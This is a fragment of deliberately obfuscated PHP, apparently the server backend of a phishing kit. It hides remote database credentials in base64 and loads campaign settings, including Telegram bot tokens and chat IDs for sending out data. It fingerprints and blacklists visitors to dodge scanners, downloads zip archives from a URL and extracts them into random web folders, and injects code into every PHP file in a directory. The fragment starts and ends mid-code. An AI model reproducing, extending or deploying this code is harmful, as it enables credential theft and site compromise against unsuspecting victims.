CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto m531R; RLgfb: deleteOldFolders("\167\x65\x62"); goto EpTj7; JP411: $local_userAgent = isset($_SERVER["\x48\124\x54\x50\x5f\x55\123\105\122\137\x41\x47\x45\x4e\x54"]) ? $_SERVER["\x48\124\124\120\137\125\123\x45\122\x5f\101\107\x45\116\x54"] : ''; goto bEFC5; UTzWL: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\x2f", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\377", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\x4e", $subnetBin)[1]; $ipInt = unpack("\x4e", $ipBin)[1]; $maskInt = unpack("\116", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto O2ITC; hdNMF: $fs_host = base64_decode("\x4d\x54\153\64\114\x6a\x49\x31\x4d\x53\x34\64\x4e\x43\64\x79\x4d\104\101"); goto yhO0V; ZriIU: ob_start(); goto nqdYC; UEncF: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\156\145\x63\x74\151\x6f\156\x20\146\141\151\154\145\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\x53\x45\x4c\105\x43\x54\x20\x2a\40\106\x52\x4f\115\x20\x72\x65\144\151\162\x63\164\151\x6f\156\40\127\x48\105\122\x45\x20\151\144\x3d\x27{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\x69\156\153"] = base64_decode(base64_decode($row["\x6c\x69\156\x6b"])); $_SESSION["\x63\156"] = explode("\73", base64_decode(base64_decode($row["\x63\157\165\x6e\164\162\171"]))); $_SESSION["\x70\x69\x63"] = $row["\x70\151\x63"]; $_SESSION["\x6d\163\147"] = base64_decode(base64_decode($row["\155\163\147"])); $_SESSION["\145\170\x70\151\x72\x65\137\x64\x61\x74\145"] = $row["\x65\x78\160\x69\162\x65\137\144\x61\x74\145"]; $_SESSION["\x73\x65\x72\x76\145\x72"] = base64_decode(base64_decode($row["\163\x65\x72\x76\x65\162"])); $_SESSION["\x75\x72\154"] = base64_decode(base64_decode($row["\x75\x72\154"])); $_SESSION["\154\x75\x78\x63\141\x70\164\x63\x68\x61"] = $row["\154\x75\x78\x63\x61\160\164\143\150\x61"]; $_SESSION["\164\157\153\x65\156\x74\145\154"] = base64_decode(base64_decode($row["\x74\x6f\x6b\x65\x6e\x74\145\x6c"])); $_SESSION["\151\x64\x74\x65\154"] = base64_decode(base64_decode($row["\151\x64\164\145\154"])); $_SESSION["\x72\x65\x64\x69\162\x69\x63\x74"] = $row["\162\145\144\x69\x72\151\143\164"]; $_SESSION["\160\x72\x6f\x6a\x65\x63\164"] = $row["\160\x72\x6f\152\145\143\x74"]; $_SESSION["\141\160\151"] = $row["\141\160\x69"]; $_SESSION["\x61\144\x64\x62\x79"] = $row["\x61\x64\x64\x62\171"]; $_SESSION["\x69\163\x70\x72\x6f\164\145\x63\164"] = $row["\151\x73\x70\162\157\164\145\x63\164"]; $_SESSION["\160\x72\x6f\x78\171"] = $row["\x70\162\157\170\171"]; $_SESSION["\x63\141\160\164\143\x68\x61\137\144\x61\164\141"] = $row["\143\141\160\164\x63\150\141"]; $_SESSION["\147\157\x6f\x6c\145\x5f\x63\141\x70"] = $row["\147\x6f\157\147\154\x65\x5f\143\141\x70"]; $_SESSION["\x63\x6c\x6f\165\x64\x5f\143\x61\160"] = $row["\x63\x6c\157\165\144\137\x63\141\160"]; $_SESSION["\160\162\x6f\137\151\143\x6f"] = $row["\160\162\157\x5f\x69\x63\x6f"]; $_SESSION["\160\162\157\137\143\157\x6c\x6f\162"] = $row["\x70\x72\157\x5f\x63\x6f\154\x6f\162"]; $_SESSION["\160\162\x6f\137\155\163\147"] = $row["\x70\162\157\137\155\163\x67"]; $_SESSION["\160\x72\x6f\x5f\x69\x6d\147"] = $row["\160\x72\x6f\137\x69\155\147"]; $_SESSION["\160\x72\157\x5f\x6c\157\147\x6f"] = $row["\x70\162\157\x5f\x6c\157\147\x6f"]; } } else { $refix = "\156\157\x74\x20\x66\x6f\165\156\144\x20\151\x64\56{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto PpG7G; L6gJr: header("\101\x63\x63\145\x73\x73\x2d\103\x6f\x6e\164\162\157\154\x2d\x41\x6c\154\157\x77\55\115\145\164\x68\157\x64\163\72\x20\x50\117\123\x54"); goto IDItT; sixaW: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\145\x78\160\151\x72\145\137\144\x61\164\x65"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\157\x6b\x65\x6e\x74\x65\154", $token, time() + 86400 * 30, "\x2f"); setcookie("\151\x64\x74\145\154", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\x72\145\x64\151\x72\x69\x63\x74", $_SESSION["\x72\145\144\151\x72\151\x63\164"], time() + 86400 * 30, "\57"); setcookie("\x70\x72\x6f\x6a\x65\143\x74", $_SESSION["\x70\x72\157\x6a\x65\x63\x74"], time() + 86400 * 30, "\57"); setcookie("\x73\x6f\165\162\143\145\155\x65", $_SESSION["\141\144\144\x62\171"], time() + 86400 * 30, "\x2f"); setcookie("\x6e\x65\167\x5f\x65\x78\160", $expireTimestamp, time() + 86400 * 30, "\57"); setcookie("\166\157\154\x6d", $token, time() + 86400 * 30, "\57"); setcookie("\144\157\x6c\x6d", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\164\157\x6b\145\x6e\164\x65\x6c", $_SESSION["\x74\x6f\153\x65\156\164\x65\x6c"], time() + 86400 * 30, "\57"); setcookie("\151\144\x74\x65\154", $_SESSION["\x69\144\164\145\154"], time() + 86400 * 30, "\57"); setcookie("\162\145\x64\x69\162\151\x63\x74", $_SESSION["\x72\x65\144\151\x72\x69\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\157\x6a\x65\x63\x74", $_SESSION["\160\x72\x6f\152\x65\143\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x73\x6f\x75\162\143\x65\155\x65", $_SESSION["\x61\144\144\x62\x79"], time() + 86400 * 30, "\57"); setcookie("\166\157\154\155", $token, time() + 86400 * 30, "\x2f"); setcookie("\x64\x6f\x6c\155", $chatid, time() + 86400 * 30, "\x2f"); } } goto N8qBL; etzZZ: $local_browser = get_browser_value($local_userAgent); goto RLgfb; kVIKC: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\125\x6e\x6b\156\157\167\x6e\x20\x42\x72\x6f\x77\163\x65\x72"; $BROWSER = array("\x2f\155\163\x69\x65\57\x69" => "\111\x6e\x74\145\x72\x6e\145\164\40\x45\170\x70\x6c\157\x72\145\162", "\57\146\x69\x72\145\146\157\170\57\x69" => "\x46\151\x72\x65\x66\x6f\170", "\57\163\141\x66\x61\x72\x69\57\x69" => "\x53\x61\146\x61\x72\151", "\57\x63\x68\162\157\155\x65\57\151" => "\103\150\x72\157\x6d\x65", "\x2f\x65\x64\x67\145\x2f\x69" => "\105\144\147\145", "\57\157\160\145\x72\141\x2f\x69" => "\117\x70\x65\162\141", "\57\x6e\145\164\163\143\x61\x70\x65\57\x69" => "\116\x65\164\163\143\x61\160\x65", "\57\155\x61\x78\x74\150\157\x6e\57\151" => "\115\x61\x78\x74\150\157\x6e", "\57\x6b\x6f\156\x71\165\145\x72\157\x72\57\x69" => "\113\157\x6e\161\165\x65\x72\x6f\x72", "\x2f\x6d\x6f\142\x69\x6c\145\x2f\151" => "\110\141\x6e\x64\x68\145\x6c\144\x20\102\162\157\x77\x73\145\162"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto zj0VF; PX0PH: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\x6e\156\x65\143\164\x69\x6f\x6e\40\146\141\151\154\x65\x64\72\40" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\x45\x43\x54\x20\164\157\153\x65\156\x2c\x20\143\150\x61\x74\151\144\40\106\x52\x4f\x4d\40\160\141\x6e\145\154\40\x57\110\x45\x52\x45\x20\x70\141\156\145\154\x5f\165\x73\x65\162\x3d\x27{$user}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\x74\157\x6b\x65\x6e"]; $chatid = $row["\x63\x68\x61\x74\151\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto AVK7T; hDHOU: function fetchIPInfo($ipAddress_send) { global $fs_host, $fs_user, $fs_log, $fs_name, $ipAddress, $data_country, $data_isp; $url = "\x68\x74\x74\x70\x3a\x2f\x2f\151\x70\55\141\x70\x69\x2e\x63\x6f\x6d\57\152\163\x6f\x6e\57{$ipAddress_send}\77\146\151\x65\x6c\x64\163\x3d\163\x74\141\x74\x75\163\54\155\145\x73\163\x61\x67\145\x2c\143\157\156\x74\151\156\x65\x6e\164\54\143\x6f\156\164\151\x6e\x65\156\164\x43\x6f\x64\145\54\143\x6f\x75\x6e\x74\x72\171\54\143\x6f\165\x6e\x74\x72\x79\103\x6f\x64\x65\54\162\145\147\x69\x6f\x6e\54\x72\145\147\151\157\156\x4e\x61\x6d\x65\x2c\x63\151\164\171\x2c\144\x69\163\164\x72\x69\x63\164\54\172\x69\x70\x2c\x6c\141\164\x2c\x6c\157\156\54\164\151\155\x65\172\x6f\x6e\x65\54\x6f\146\146\x73\x65\164\54\143\165\x72\162\145\156\143\x79\54\x69\163\x70\x2c\157\162\x67\54\141\163\x2c\x61\x73\156\141\155\145\54\x72\145\x76\x65\162\x73\145\54\155\157\142\x69\x6c\x65\54\160\x72\x6f\x78\x79\54\150\x6f\x73\164\x69\156\x67\x2c\x71\x75\x65\162\171"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = json_decode($response, true); if (isset($info["\163\x74\x61\164\165\x73"]) && $info["\163\x74\141\164\x75\x73"] !== "\x73\165\143\x63\145\x73\x73") { $_SESSION["\x73\145\x73\x73\x69\157\x6e\x5f\151\x73\x70"] = "\125\x6e\x6b\156\x6f\x77\156"; $_SESSION["\x73\x65\163\163\x69\157\x6e\x5f\x63\157\x75\x6e\x74\162\x79"] = "\x55\156\x6b\156\157\167\x6e"; $_SESSION["\x73\145\x73\x73\x69\157\x6e\x5f\143\x6f\x75\156\x74\162\x79\x5f\143\157\x64\145"] = "\125\x6e\x6b\x6e\157\167\x6e"; $_SESSION["\163\145\x73\x73\x69\157\156\x5f\x63\x69\x74\x79"] = "\125\156\x6b\x6e\157\x77\156"; $_SESSION["\163\x65\x73\163\x69\x6f\156\x5f\162\x65\147\151\157\x6e"] = "\125\x6e\153\156\157\167\x6e"; $_SESSION["\x73\145\163\x73\x69\x6f\156\x5f\160\162\x6f\x78\x79"] = "\106\141\x6c\x73\x65"; $_SESSION["\163\145\x73\163\x69\x6f\x6e\137\155\157\x62\151\154\145"] = "\106\x61\x6c\163\x65"; $_SESSION["\163\145\x73\163\x69\x6f\156\137\x68\x6f\163\x74\x69\156\x67"] = "\106\141\x6c\x73\145"; return; } $data_country = isset($info["\143\157\x75\x6e\x74\162\x79"]) ? $info["\x63\157\x75\156\x74\x72\x79"] : null; $data_isp = isset($info["\x69\x73\x70"]) ? $info["\151\x73\160"] : null; $_SESSION["\163\x65\x73\163\151\x6f\156\137\151\x73\160"] = isset($info["\151\163\160"]) ? $info["\151\163\160"] : null; $_SESSION["\x73\x65\163\163\151\157\x6e\x5f\x63\157\165\x6e\164\162\x79"] = isset($info["\x63\157\x75\x6e\164\162\171"]) ? $info["\143\157\165\156\164\x72\x79"] : null; $_SESSION["\x73\145\163\163\x69\x6f\x6e\x5f\143\x6f\x75\x6e\164\x72\x79\137\143\157\144\x65"] = isset($info["\143\157\x75\156\x74\162\171\103\157\x64\145"]) ? $info["\143\157\165\x6e\x74\x72\x79\x43\x6f\144\x65"] : null; $_SESSION["\163\145\x73\163\x69\157\x6e\x5f\x63\151\x74\x79"] = isset($info["\x63\x69\x74\x79"]) ? $info["\x63\151\164\x79"] : null; $_SESSION["\x73\145\163\x73\x69\157\156\x5f\x72\145\x67\x69\x6f\156"] = isset($info["\x72\145\x67\151\x6f\x6e\x4e\141\x6d\x65"]) ? $info["\162\x65\x67\x69\x6f\x6e\x4e\141\x6d\145"] : null; $_SESSION["\x73\145\x73\x73\151\157\x6e\x5f\160\x72\157\170\x79"] = isset($info["\160\x72\x6f\x78\x79"]) && $info["\160\162\157\x78\171"] ? "\124\x72\x75\145" : "\x46\x61\154\x73\145"; $_SESSION["\x73\145\x73\x73\151\x6f\x6e\x5f\x6d\x6f\142\x69\154\145"] = isset($info["\155\157\x62\x69\154\x65"]) && $info["\x6d\157\142\x69\x6c\145"] ? "\x54\162\165\x65" : "\106\141\154\x73\x65"; $_SESSION["\163\145\163\x73\151\x6f\156\137\x68\157\163\x74\x69\x6e\147"] = isset($info["\x68\x6f\x73\164\x69\x6e\x67"]) && $info["\x68\157\163\x74\151\x6e\147"] ? "\124\x72\165\x65" : "\x46\x61\154\x73\145"; } goto rKRwM; O2ITC: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\x2e" || $file == "\56\56") { continue; } if (is_dir($directory . "\57" . $file)) { $lastModified = filemtime($directory . "\57" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\57" . $file); } } } } goto YF2s3; tY1Ls: $fs_name = base64_decode("\145\155\126\171\142\x32\122\150\x65\x58\116\x66\132\x47\x46\x35"); goto JP411; VaVl5: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto hdNMF; N8qBL: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\145\170\160\151\x72\x65\137\x64\x61\x74\x65"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\164\x6f\153\145\x6e\164\x65\x6c", $token, time() + 86400 * 30, "\57"); setcookie("\x69\144\164\145\x6c", $chatid, time() + 86400 * 30, "\57"); setcookie("\x72\145\144\x69\x72\151\143\164", $_SESSION["\x72\x65\x64\x69\x72\x69\x63\164"], time() + 86400 * 30, "\57"); setcookie("\160\162\157\x6a\x65\143\164", $_SESSION["\x70\x72\x6f\152\x65\143\164"], time() + 86400 * 30, "\57"); setcookie("\x73\157\165\162\143\x65\155\x65", $_SESSION["\141\x64\x64\x62\171"], time() + 86400 * 30, "\x2f"); setcookie("\156\x65\x77\x5f\145\170\160", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\x76\x6f\154\155", $token, time() + 86400 * 30, "\57"); setcookie("\144\157\x6c\x6d", $chatid, time() + 86400 * 30, "\x2f"); } else { setcookie("\164\157\x6b\x65\156\x74\x65\x6c", $token_view, time() + 86400 * 30, "\x2f"); setcookie("\151\144\164\145\x6c", $chatid_view, time() + 86400 * 30, "\57"); setcookie("\x72\x65\144\x69\x72\x69\143\x74", $_SESSION["\162\x65\x64\x69\162\x69\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\162\157\x6a\145\x63\x74", $_SESSION["\160\x72\157\x6a\x65\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\x75\162\x63\x65\x6d\x65", $_SESSION["\x61\x64\144\142\171"], time() + 86400 * 30, "\x2f"); setcookie("\x76\157\154\155", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\157\154\x6d", $chatid, time() + 86400 * 30, "\x2f"); } } goto fmQ2W; AVK7T: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\157\156\x6e\x65\143\x74\151\x6f\x6e\40\x66\x61\x69\x6c\145\144\x3a\x20" . mysqli_connect_error()); } $sql_check = "\123\x45\x4c\x45\x43\x54\40\52\40\x46\x52\117\x4d\40\154\157\x67\x73\40\x57\110\105\x52\x45\x20\x69\160\141\x64\x64\162\x65\163\75\77"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\163", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\162\x65\x73\137\163\x74\x61\x74\165\163" => "\64\60\65", "\x6d\145\163\163\x61\147\145" => "\x55\163\x65\x72\x20\x69\x73\x20\141\x6c\162\x65\x61\x64\171\x20\151\x6e\40\x74\150\x65\40\x62\x6c\x61\143\x6b\x6c\151\x73\164"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\x65\x73\x73\151\157\156\137\x63\x6f\165\x6e\x74\x72\x79"])); $browser = mysqli_real_escape_string($db, str_replace("\x27", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\x27", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\x27", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\47", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\145\163\163\151\157\x6e\137\151\163\x70"])); $mobile = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\x65\163\x73\151\157\156\x5f\155\157\142\151\154\145"])); $proxy = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\145\x73\x73\x69\x6f\156\137\160\162\x6f\170\171"])); $hosting = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\x65\x73\x73\x69\x6f\156\x5f\150\157\163\x74\151\x6e\147"])); $city = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\x73\163\x69\157\x6e\x5f\x63\x69\x74\x79"])); $region = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\x73\x73\x69\157\x6e\x5f\162\x65\147\x69\x6f\x6e"])); $time = mysqli_real_escape_string($db, str_replace("\x27", '', $local_time)); $sql_insert = "\x49\x4e\x53\105\122\x54\40\111\116\124\x4f\40\x6c\157\147\163\x20\50\151\160\x61\x64\144\x72\x65\163\54\143\157\x75\x6e\164\162\x79\x2c\x62\x72\x6f\x77\x73\145\162\54\157\163\54\x64\157\155\151\x6e\x65\x2c\x68\x6f\163\164\x2c\x69\163\160\54\x6d\157\x62\151\x6c\x65\54\x70\x72\157\170\171\54\x68\x6f\x73\164\151\x6e\147\x2c\x63\x69\164\x79\x2c\x72\x65\147\x69\157\x6e\x2c\x6d\171\x74\151\x6d\x65\x2c\162\145\x73\157\156\x29\40\126\x41\114\125\105\123\x20\x28\x3f\x2c\77\54\x3f\54\x3f\x2c\x3f\54\x3f\54\77\54\x20\77\x2c\x20\x3f\54\40\x3f\54\x20\x3f\x2c\40\x3f\54\x20\x3f\x2c\x20\77\x29"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\x73\x73\x73\x73\163\163\163\163\x73\x73\163\163\163\x73", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\162\x65\x73\x5f\x73\x74\141\x74\165\x73" => "\64\x30\65", "\155\145\163\x73\141\147\x65" => "\x55\163\145\162\40\x61\x64\144\x65\x64\40\164\157\x20\x74\150\x65\x20\142\x6c\141\x63\x6b\154\x69\x73\164"); echo json_encode($responseData); die; } goto VqPk6; YF2s3: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\56" && $object != "\56\56") { if (is_dir($dir . "\57" . $object)) { deleteDirectory($dir . "\x2f" . $object); } else { unlink($dir . "\57" . $object); } } } reset($objects); rmdir($dir); } } goto I0_pa; EsW2_: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto j07cC; xEj0b: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\56\56") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\x70\x68\160") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto kz6li; E2HIZ: header("\x43\x6f\x6e\164\x65\x6e\x74\55\x54\171\x70\145\72\x20\141\x70\x70\154\x69\x63\141\164\x69\157\156\x2f\152\x73\157\x6e"); goto GHWQV; I0_pa: function download_extract($zipFileUrl) { if (!is_dir("\167\145\x62")) { if (!mkdir("\x77\x65\x62", 511)) { die("\106\x61\x69\x6c\x65\x64\x20\x74\157\40\x63\x72\145\141\164\x65\40\167\145\x62\40\x64\x69\x72\145\143\164\x6f\162\171"); } } if (!is_dir("\164\145\x6d\x70")) { mkdir("\164\x65\155\x70"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\167\x65\x62\x2f{$sub_folder}\x2f"; $_SESSION["\146\157\154\x64\x65\x72"] = $folder_path; $zipFileName = "\164\145\x6d\160\57{$folder_name}\56\172\x69\160"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\x61\151\x6c\145\x64\x20\164\157\40\143\x72\145\x61\164\145\x20\x74\150\x65\40\146\157\154\x64\x65\x72\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\162\145\163\x5f\163\164\141\x74\x75\163" => "\x34\x30\65", "\155\x65\163\163\x61\147\x65" => "\x46\x61\x69\154\x65\x64\x20\x74\157\40\145\170\x74\162\x61\x63\x74\x20\x74\x68\145\40\172\x69\160\x20\x66\151\x6c\145"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\x72\x65\x73\x5f\x73\164\141\x74\x75\163" => "\x34\x30\65", "\155\145\163\163\141\x67\x65" => "\x46\x61\151\x6c\145\x64\40\x74\x6f\40\144\157\167\x6e\154\157\141\x64\x20\164\150\145\40\x7a\x69\160\x20\x66\x69\154\145"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto N0Jys; m531R: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\x2e" && $file != "\x2e\56") { $filePath = $directory . "\x2f" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\160\150\x70" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto v6pG_; EpTj7: $currentTimestamp = time(); goto c0D3x; NqI3p: $fs_log = base64_decode("\x5a\110\112\x6a\132\62\154\163\145\126\101\167\113\x6d\163\155"); goto tY1Ls; ADBRI: $local_os = get_platform($local_userAgent); goto etzZZ; bEFC5: $local_time = date("\x59\55\155\x2d\144\40\x48\x3a\x69\x3a\x73"); goto KoPwq; iFvw8: function random_number($length) { $characters = "\x30\61\x32\63\64\65\x36\x37\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto UEncF; FvkpH: ')); ?>
